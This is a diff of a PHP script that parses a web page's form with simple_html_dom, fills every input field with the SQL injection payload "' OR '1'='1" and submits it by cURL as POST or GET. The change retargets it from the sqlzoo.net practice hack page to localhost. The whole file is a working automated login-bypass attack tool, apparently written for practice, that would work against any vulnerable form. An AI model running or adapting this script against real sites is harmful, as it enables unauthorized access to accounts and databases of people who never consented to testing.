@@ -2,7 +2,7 @@
     include_once('./simple_html_dom.php');
 
     // URL to GET
-    $url = 'https://sqlzoo.net/hack/';
+    $url = 'http://localhost/novo';
     // DOM a partir da URL
     $html = file_get_html($url);
 
@@ -20,7 +20,11 @@
         array_push($inputs, $input);
     }
 
-    getRequest();
+    if ($form->method == 'POST') {
+        postRequest();   
+    } else {
+        getRequest();
+    }
 
     #endsection
 
@@ -29,14 +33,17 @@
 
         $data = array();
         foreach($inputs as $input) {
-            $data[$input->name] = "' OR ''='";
+            // $data[$input->name] = "1";
+            $data[$input->name] = "' OR '1'='1";
         }
-
+        
         if (strpos($url, 'http')) {
             $curl = curl_init($url);
         } else {
-            $curl = curl_init($url . $forms[0]->action);
+            $curl = curl_init($url . '/' . $forms[0]->action);
+            echo $url . $forms[0]->action;
         }
+
         curl_setopt($curl, CURLOPT_POST, true);
         curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
@@ -48,8 +55,7 @@
     function getRequest() {
         global $url, $forms, $inputs;
 
-        $urlGet = $url . '/passwd.pl?';
-        $sqlStr = '"OR 1=1"';
+        $sqlStr = "' OR '1'='1";
 
         foreach($inputs as $input) {
             echo $input->name;
